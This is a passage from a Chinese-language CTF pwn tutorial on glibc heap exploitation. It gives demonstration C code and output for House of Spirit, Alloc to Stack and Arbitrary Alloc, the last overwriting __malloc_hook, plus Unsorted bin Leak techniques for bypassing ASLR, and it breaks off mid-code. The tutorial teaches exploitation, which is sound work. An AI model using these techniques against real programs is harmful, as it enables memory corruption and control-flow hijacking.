E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment">// this is the size</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) &amp;&amp; &lt; av->system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>    fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span> <span class="token comment">// nextsize</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the overwritten pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(0x30): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">This file demonstrates the house of spirit attack<span class="token punctuation">.</span>Calling <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> once so that it sets up its memory<span class="token punctuation">.</span>We will now overwrite a pointer to point to a fake <span class="token char">'fastbin'</span> region<span class="token punctuation">.</span>This <span class="token function">region</span> <span class="token punctuation">(</span>memory of length<span class="token operator">:</span> <span class="token number">80</span><span class="token punctuation">)</span> contains two chunks<span class="token punctuation">.</span> The first starts at <span class="token number">0x7ffc9e07e6d8</span> <span class="token operator">and</span> the second at <span class="token number">0x7ffc9e07e708.</span>This chunk<span class="token punctuation">.</span>size of <span class="token keyword">this</span> region has to be <span class="token number">16</span> more than the <span class="token function">region</span> <span class="token punctuation">(</span>to accomodate the chunk data<span class="token punctuation">)</span> <span class="token keyword">while</span> still falling into the fastbin <span class="token function">category</span> <span class="token punctuation">(</span><span class="token operator">&lt;=</span> <span class="token number">128</span> on x64<span class="token punctuation">)</span><span class="token punctuation">.</span> The <span class="token function">PREV_INUSE</span> <span class="token punctuation">(</span>lsb<span class="token punctuation">)</span> bit is ignored by free <span class="token keyword">for</span> fastbin<span class="token operator">-</span>sized chunks<span class="token punctuation">,</span> however the <span class="token function">IS_MMAPPED</span> <span class="token punctuation">(</span>second lsb<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token function">NON_MAIN_ARENA</span> <span class="token punctuation">(</span>third lsb<span class="token punctuation">)</span> bits cause problems<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> note that <span class="token keyword">this</span> has to be the size of the next malloc request rounded to the internal size used by the malloc implementation<span class="token punctuation">.</span> E<span class="token punctuation">.</span>g<span class="token punctuation">.</span> on x64<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x38</span> will all be rounded to <span class="token number">0x40</span><span class="token punctuation">,</span> so they would work <span class="token keyword">for</span> the malloc parameter at the end<span class="token punctuation">.</span> The chunk<span class="token punctuation">.</span>size of the <span class="token operator">*</span>next<span class="token operator">*</span> fake region has to be sane<span class="token punctuation">.</span> That is <span class="token operator">></span> <span class="token number">2</span><span class="token operator">*</span><span class="token function">SIZE_SZ</span> <span class="token punctuation">(</span><span class="token operator">></span> <span class="token number">16</span> on x64<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">&lt;</span> av<span class="token operator">-></span><span class="token function">system_mem</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span> <span class="token number">128</span>kb by <span class="token keyword">default</span> <span class="token keyword">for</span> the main arena<span class="token punctuation">)</span> to pass the nextsize integrity checks<span class="token punctuation">.</span> No need <span class="token keyword">for</span> fastbin size<span class="token punctuation">.</span>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk<span class="token punctuation">,</span> <span class="token number">0x7ffc9e07e6d8.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> note that the memory address of the <span class="token operator">*</span>region<span class="token operator">*</span> associated with <span class="token keyword">this</span> chunk must be <span class="token number">16</span><span class="token operator">-</span>byte aligned<span class="token punctuation">.</span>Freeing the overwritten pointer<span class="token punctuation">.</span>Now the next malloc will <span class="token keyword">return</span> the region of our fake chunk at <span class="token number">0x7ffc9e07e6d8</span><span class="token punctuation">,</span> which will be <span class="token number">0x7ffc9e07e6e0</span><span class="token operator">!</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">0x7ffc9e07e6e0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>想要使用 House Of Spirit 的技术分配 <code>chunk</code> 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong></p></blockquote><hr><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><blockquote><p>该技术的核心点在于劫持 <code>fast bin</code> 链表中 <code>chunk</code> 的 <code>fd</code> 指针，<strong>把 <code>fd</code> 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据</strong>，比如：返回地址等，需要栈上存在有满足条件的 <code>size</code> 值</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_chunk</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pre_size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> fd<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> bk<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CHUNK<span class="token punctuation">,</span> <span class="token operator">*</span>PCHUNK<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    CHUNK stack_chunk<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>    stack_chunk<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x21</span><span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> chunk1 <span class="token operator">=</span> <span class="token operator">&amp;</span>stack_chunk<span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk_a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这次我们把 <code>fake_chunk</code> 置于栈中称为 <code>stack_chunk</code></p><p>同时劫持了 <code>fast bin</code> 链表中 <code>chunk</code> 的 <code>fd</code> 值，通过把这个 <code>fd</code> 值指向 <code>stack_chunk</code> 就可以实现在栈中分配 <code>fast bin chunk</code></p></blockquote><p>执行 <code>*(long long *)chunk1=&amp;stack_chunk</code> 后，<code>chunk1</code> 的 <code>fd</code> 指针指向了 <code>stack_chunk</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A852.png" alt="CTF - PWN_堆相关的漏洞与利用52.png"></p><p>第一次执行 <code>malloc</code> 使得 <code>fast bin</code> 链表指向了 <code>stack_chunk</code>，这意味着下一次分配会使用 <code>stack_chunk</code> 的内存进行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A853.png" alt="CTF - PWN_堆相关的漏洞与利用53.png"></p><p>可以看到第二次执行 <code>malloc</code> 的返回值 RAX 为 0x7fffffffdc80，也就是 <code>stack_chunk</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A854.png" alt="CTF - PWN_堆相关的漏洞与利用54.png"></p><p><code>stack_chunk</code> 的地址在栈上，而不在堆上：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A855.png" alt="CTF - PWN_堆相关的漏洞与利用55.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A856.png" alt="CTF - PWN_堆相关的漏洞与利用56.png"></p><hr><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><blockquote><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是<strong>分配的目标不再是栈中</strong></p><p>Arbitrary Alloc 在 CTF 中使用更加频繁，我们可以利用字节错位等方法来绕过 <code>size</code> 域的检验，实现任意地址分配 <code>chunk</code>，最后的效果也就相当于<strong>任意地址写任意值</strong></p></blockquote><p>实际上，只要满足目标地址存在合法的 <code>size</code> 域（这个 <code>size</code> 域是构造的，还是自然存在的都无妨），我们可以把 <code>chunk</code> 分配到任意的可写内存中，比如：<code>bss</code>、<code>heap</code>、<code>data</code>、<code>stack</code> 等等</p><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> chunk1 <span class="token operator">=</span> <span class="token number">0x7ffff7dd1af5</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk_a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在这个例子中，我们使用字节错位来实现直接分配 <code>fast bin</code> 到 <code>__malloc_hook</code> 的位置，相当于覆盖 <code>__malloc_hook</code> 来控制程序流程</p></blockquote><p>上述代码中的 <code>0x7ffff7dd1af5</code> 是根据本机的情况得出的值，想要得到这个值，首先我们要观察欲写入地址 <code>__malloc_hook</code> 附近是否存在可以字节错位的情况</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A857.png" alt="CTF - PWN_堆相关的漏洞与利用57.png"></p><p>图中 <code>0x7ffff7dd1b10</code> 是我们想要控制的 <code>__malloc_hook</code> 的地址，于是我们向上寻找是否可以错位出一个合法的 <code>size</code> 域。因为这是个 64 位程序，因此 <code>fast bin</code> 的范围为 32 字节到 128 字节 (<code>0x20 - 0x80</code>)</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//这里的 size 指用户区域，因此要小 2 倍 SIZE_SZ</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">]</span>Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x70</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>观察发现 <code>0x7ffff7dd1af5</code> 处可以实现错位构造出一个 <code>0x000000000000007f</code>，因为 <code>0x7f</code> 在计算 <code>fast bin index</code> 时，是属于 <code>index 5</code> 的，即 <code>chunk</code> 大小为 <code>0x70</code>：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">##define <span class="token function">fastbin_index</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span>                                                      \    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span>SIZE_SZ <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">?</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment">// 注意 sz 的大小是 unsigned int，因此只占 4 个字节</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而 <code>chunk</code> 大小为 <code>0x70</code> 又包含了 <code>0x10</code> 的 <code>chunk_header</code>，因此我们选择分配 <code>0x60</code> 的 <code>fast bin</code>，将其加入链表：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A858.png" alt="CTF - PWN_堆相关的漏洞与利用58.png"></p><p>经过两次 <code>malloc</code> 分配后，可以观察到 <code>chunk</code> 被分配到 <code>0x7ffff7dd1afd</code>，因此我们就可以直接控制 <code>__malloc_hook</code> 的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A859.png" alt="CTF - PWN_堆相关的漏洞与利用59.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A860.png" alt="CTF - PWN_堆相关的漏洞与利用60.png"></p><p>在我的 Glibc 2.23 中 <code>__realloc_hook</code> 与 <code>__malloc_hook</code> 是连在一起的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A861.png" alt="CTF - PWN_堆相关的漏洞与利用61.png"></p><hr><h1 id="Unsorted-bin-Attack"><a href="#Unsorted-bin-Attack" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h1><blockquote><p>Unsorted bin Attack 是一类漏洞的利用方法，是指所有基于 <code>unsorted bin</code> 机制的漏洞利用方法</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/#unsorted-bin">Unsorted Bin Attack - CTF Wiki</a></p></blockquote><p>Unsorted bin Attack 的利用前提：</p><ul><li>控制 <code>unsorted bin chunk</code> 的 <code>bk</code> 指针</li></ul><p>Unsorted bin Attack 可以达到的效果是：<strong>实现修改任意地址值为一个较大的数值</strong></p><hr><h2 id="Unsorted-bin-Leak"><a href="#Unsorted-bin-Leak" class="headerlink" title="Unsorted bin Leak"></a>Unsorted bin Leak</h2><blockquote><p><code>unsorted bin</code> 首先可以用来<strong>泄露一些信息</strong></p></blockquote><p>由于 <code>unsorted bin</code> 在管理时为循环双向链表，若 <code>unsorted bin</code> 中有两个 <code>bin</code>，那么该链表结构如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A862.png" alt="CTF - PWN_堆相关的漏洞与利用62.png"></p><p>也就是说，在该链表中必有一个节点（不准确的说，是尾节点，这个就意会一下把，毕竟循环链表实际上没有头尾）的 <code>fd</code> 指针会指向 <code>main_arena</code> 结构体内部</p><p>如果我们可以把正确的 <code>fd</code> 指针泄露出来，就可以获得一个与 <code>main_arena</code> 有固定偏移的地址，这个偏移可以通过 GDB 调试得出</p><blockquote><p><code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc2</code> 管理主分配区的唯一实例，其会被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上</p><p><strong>如果我们有进程所使用的 <code>libc.so</code> 文件的话，就可以获得 <code>main_arena</code> 与 libc 基地址的偏移，实现对 <code>ASLR</code> 的绕过</strong></p></blockquote><p>获得 <code>main_arena</code> 与 libc 基地址的偏移主要有两种方法：</p><ul><li>通过 <code>__malloc_trim</code> 函数得出  </li><li>通过 <code>__malloc_hook</code> 直接计算</li></ul><p>一般来说，要实现 Unsorted bin Leak，需要有 UAF</p><blockquote><p>在 CTF 中，一般的笔记管理题都会有 <code>show</code> 的功能，对<strong>处于 unsorted bin 链表尾的节点</strong> <code>show</code> 就可以获得 <code>libc</code> 的基地址了</p><p>另外，CTF 中堆往往是刚刚初始化的，所以 <code>unsorted bin</code> 一般都是干净的，<mark>当 <code>unsorted bin</code> 中只存在一个 <code>bin</code> 的时候，该 <code>bin</code> 的 <code>fd</code> 和 <code>bk</code> 都会指向 <code>main_arena</code> 中</mark></p></blockquote><p>另外，<strong>如果我们无法做到访问链表尾，但是可以访问链表头</strong>：</p><ul><li>在 32 位的环境下，对链表头进行 <code>printf</code> 等操作，往往可以把 <code>fd</code> 和 <code>bk</code> 一起输出出来，这个时候同样可以实现有效的 leak  </li><li>在 64 位的环境下，由于高地址往往为 <code>\x00</code>，很多输出函数会被截断，这个时候可能就难以实现有效的 leak</li></ul><hr><h3 id="通过-malloc-trim-得到偏移"><a href="#通过-malloc-trim-得到偏移" class="headerlink" title="通过 __malloc_trim() 得到偏移"></a>通过 __malloc_trim() 得到偏移</h3><p>在 <code>malloc.c</code> 中有这样一段代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span><span class="token function">__malloc_trim</span> <span class="token punctuation">(</span>size_t s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>__malloc_initialized <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token function">ptmalloc_init</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  mstate ar_ptr <span class="token operator">=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">;</span>   <span class="token comment">// &lt;= here!</span>  <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      <span class="token function">__libc_lock_lock</span> <span class="token punctuation">(</span>ar_ptr<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">|=</span> <span class="token function">mtrim</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__libc_lock_unlock</span> <span class="token punctuation">(</span>ar_ptr<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>      ar_ptr <span class="token operator">=</span> ar_ptr<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>ar_ptr <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到 <code>mstate ar_ptr = &amp;main_arena</code> 这里对 <code>main_arena</code> 进行了访问，所以<strong>通过 IDA 分析 libc 文件中的 <code>malloc_trim()</code> 函数就可以得到 libc 偏移了</strong></p><p>以 Glibc 2.23 中的 <code>malloc_trim()</code> 函数为例：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A863.png" alt="CTF - PWN_堆相关的漏洞与利用63.png"></p><p>其位于 <code>.bss</code> 段上，可见 <code>main_arena</code> 与 libc 基地址的偏移为 <code>0x3C4B20</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A864.png" alt="CTF - PWN_堆相关的漏洞与利用64.png"></p><p>我们以 《<a href="%E3%80%90Asis%20CTF%202016%E3%80%91b00ks.md">【Asis CTF 2016】b00ks</a>》 一文中泄漏的地址来进行验证：（同为 Glibc 2.23 环境）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks34.png" alt="【Asis CTF 2016】b00ks34.png"></p><p><code>main_arena</code> 与 libc 基地址的偏移为：<code>0x7efea8cc9b20 - 0x7efea8905000 = 0x3c4b20</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A865.png" alt="CTF - PWN_堆相关的漏洞与利用65.png"></p><hr><h3 id="通过-malloc-hook-计算偏移"><a href="#通过-malloc-hook-计算偏移" class="headerlink" title="通过 __malloc_hook 计算偏移"></a>通过 __malloc_hook 计算偏移</h3><p><code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址</p><p>因此 <code>main_arena</code> 与 libc 基地址的偏移可以直接得到：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">main_arena_offset <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Unsorted-bin-Attack-1"><a href="#Unsorted-bin-Attack-1" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h2><p>在 <code>glibc/malloc/malloc.c</code> 中的 <code>_int_malloc</code> 有这么一段代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* remove from unsorted list */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): corrupted unsorted chunks 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token 